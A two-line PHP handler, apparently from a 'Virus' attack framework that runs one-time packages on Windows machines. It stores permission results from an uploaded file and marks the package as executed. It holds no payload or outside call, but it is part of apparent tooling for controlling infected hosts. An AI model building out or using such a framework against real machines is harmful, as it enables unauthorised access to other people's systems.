<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission\CheckPermission $this */

$this->setPermissions($this->requestData->fileCheck("permFile"));
$this->setExecuted();
